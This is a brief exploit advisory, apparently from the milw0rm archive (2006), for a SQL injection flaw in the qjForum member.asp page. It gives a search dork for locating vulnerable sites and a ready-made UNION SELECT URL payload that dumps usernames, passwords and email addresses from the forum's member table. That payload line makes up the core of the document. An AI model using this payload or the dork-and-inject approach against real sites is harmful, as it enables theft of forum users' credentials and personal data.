# Title  :   qjForum(member.asp) SQL Injection Vulnerability
# Author :   ajann
# greetz :   Nukedx,TheHacker
# Dork   :   "qjForum"
# Exploit:

# Login before injection.

### http://target/[path]/member.asp?uName='union%20select%200,0,0,username,0,0,pd,email,0,0,0,0,0,0,0,0,0,0,0,0%20from%20member

# milw0rm.com [2006-05-26]